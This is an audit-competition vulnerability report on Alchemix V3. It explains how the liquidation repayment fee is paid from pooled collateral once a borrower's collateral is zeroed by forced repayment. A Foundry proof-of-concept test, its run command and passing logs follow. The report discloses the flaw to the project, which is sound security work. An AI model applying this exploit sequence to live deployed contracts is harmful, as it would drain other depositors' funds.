# 56622 sc critical repayment fee overpays liquidators using pooled collateral after forcerepay

**Submitted on Oct 18th 2025 at 14:32:26 UTC by @vivekd for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56622
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

During liquidation, \_resolveRepaymentFee returns a fee based on the earmarked debt repaid. If the borrower has no collateral left—common after \_forceRepay—the function still returns the full fee even though nothing was deducted from the borrower. \_doLiquidation then pays that fee out of the Alchemist's global MYT balance, siphoning other users' collateral to the liquidator.

## Vulnerability Details

1. \_forceRepay uses the account's collateral to repay earmarked debt and can zero out account.collateralBalance.
2. \_resolveRepaymentFee computes fee = repaidAmountInYield \* repaymentFee / BPS and only reduces the borrower's balance by min(fee, account.collateralBalance). When the balance is zero, it subtracts nothing but still returns the full fee.
3. \_liquidate calls \_resolveRepaymentFee, receives the inflated feeInYield, and transfers that amount to the liquidator: TokenUtils.safeTransfer(myt, msg.sender, feeInYield). Since the borrower contributed nothing, the transfer comes directly from the Alchemist's pooled MYT (i.e., other users' collateral).
4. The PoC (testPoC\_repayment\_fee\_drains\_global\_collateral in src/test/AlchemistV3.t.sol) shows a liquidation where the liquidator collects a fee from pooled funds rather than the borrower's own shares.

## Impact Details

* A malicious liquidator can repeatedly target accounts whose collateral was consumed by \_forceRepay. Each liquidation yields a positive fee paid from pooled funds, enabling unlimited extraction.
* Every exploit reduces the Alchemist's collateralization, threatening solvency and allowing the attacker to drain the MYT pool even though borrowers cannot repay.
* All Alchemist depositors are affected: their backing collateral is transferred to the attacker through liquidation fees they should never have owed.

## Proof of Concept

## Proof of Concept

code:

```solidity
function testPoC_repayment_fee_drains_global_collateral() external {
        // Increase repayment fee to exaggerate the loss
        vm.startPrank(alOwner);
        alchemist.setRepaymentFee(5_000); // 50%
        vm.stopPrank();

        // Provide pooled liquidity from a bystander so the contract holds MYT shares
        uint256 poolContribution = 500e18;
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), poolContribution);
        alchemist.deposit(poolContribution, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // Attacker deposits and max-borrows
        uint256 attackerDeposit = 100e18;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), attackerDeposit);
        alchemist.deposit(attackerDeposit, address(0xbeef), 0);
        uint256 attackerTokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        uint256 mintAmount = alchemist.totalValue(attackerTokenId) * FIXED_POINT_SCALAR / minimumCollateralization;
        uint256 creditToYield = alchemist.convertDebtTokensToYield(mintAmount);
        alchemist.mint(attackerTokenId, mintAmount, address(0xbeef));
        vm.stopPrank();

        // Earmark attacker debt through the transmuter
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();

        vm.roll(block.number + 5_256_000);

        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply * 1_000_000);
        alchemist.poke(attackerTokenId);

        (uint256 attackerCollateralBefore,,) = alchemist.getCDP(attackerTokenId);
        uint256 contractBalanceBefore = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 liquidatorBalanceBefore = IERC20(address(vault)).balanceOf(externalUser);

        vm.startPrank(externalUser);
        (uint256 yieldAmount, uint256 feeInYield,) = alchemist.liquidate(attackerTokenId);
        vm.stopPrank();
        require(yieldAmount > 0, "liquidation did not execute");

        (uint256 attackerCollateralAfter,,) = alchemist.getCDP(attackerTokenId);
        uint256 contractBalanceAfter = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 liquidatorBalanceAfter = IERC20(address(vault)).balanceOf(externalUser);

        // Attacker collateral is wiped, yet the liquidator received the full fee.
        assertEq(attackerCollateralAfter, 0, "attacker collateral should be zero after force repay");
        uint256 collateralRemainingBeforeFee = attackerCollateralBefore > creditToYield ? attackerCollateralBefore - creditToYield : 0;
        assertGt(feeInYield, collateralRemainingBeforeFee, "fee should exceed attacker's remaining collateral");
        assertEq(liquidatorBalanceAfter - liquidatorBalanceBefore, feeInYield, "liquidator received full fee");

        uint256 contractDelta = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerContribution = creditToYield + collateralRemainingBeforeFee;
        assertGt(contractDelta, attackerContribution, "contract lost more than attacker collateral");
    }
```

1. Apply the repository test testPoC\_repayment\_fee\_drains\_global\_collateral added in `src/test/AlchemistV3.t.sol`.
2. This setup increases the repayment fee (50%), earmarks all of an attacker's debt, zeroes their collateral via \_forceRepay, and triggers liquidation.
3. Run:

```bash
FOUNDRY_PROFILE=default forge test --match-test testPoC_repayment_fee_drains_global_collateral --jobs 1 --evm-version cancun
```

4. Logs:

```
newuser@LAPTOP-MLPJMQD2:~/v3-poc$ FOUNDRY_PROFILE=default forge test --match-test testPoC_repayment_fee_drains_global_collateral --jobs 1 --evm-version cancun
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. Visit https://book.getfoundry.sh/announcements for more information. 
To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] testPoC_repayment_fee_drains_global_collateral() (gas: 2843194)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 24.44ms (3.08ms CPU time)

Ran 1 test suite in 68.42ms (24.44ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Demonstrating the fee is paid from pooled collateral, not the borrower.
